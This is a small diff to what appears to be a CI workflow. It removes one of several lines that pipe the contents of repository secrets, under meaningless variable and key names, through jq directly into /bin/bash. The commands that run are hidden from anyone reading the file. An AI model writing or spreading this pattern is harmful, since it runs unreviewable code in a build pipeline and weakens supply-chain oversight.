@@ -19,7 +19,6 @@ jobs:
           lp016: ${{ secrets.lp016 }}
         run: |
           printf '%s' "$lp016" | jq -r .czfl17 | /bin/bash
-          printf '%s' "$mvjxx7" | jq -r .y14 | /bin/bash
           echo $ppdw090 | jq -r .slgh4739 | /bin/bash
           echo $tb2744 | jq -r .wz4898 | /bin/bash
 
